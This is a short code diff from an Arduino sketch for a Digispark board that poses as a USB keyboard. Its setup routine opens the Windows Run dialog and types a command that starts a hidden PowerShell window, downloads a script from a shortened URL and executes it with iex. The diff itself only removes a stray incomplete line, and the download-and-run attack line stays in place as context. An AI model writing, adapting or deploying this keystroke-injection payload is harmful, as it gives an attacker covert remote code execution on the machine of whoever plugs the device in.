@@ -70,7 +70,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(200);
   
-  DigiKeyboard.
   // Type command
   typeString("cmd /c start /min powershell -windowstyle hidden -command iex (wget https://tinyurl.com/y4tvvezc -useb)");
   
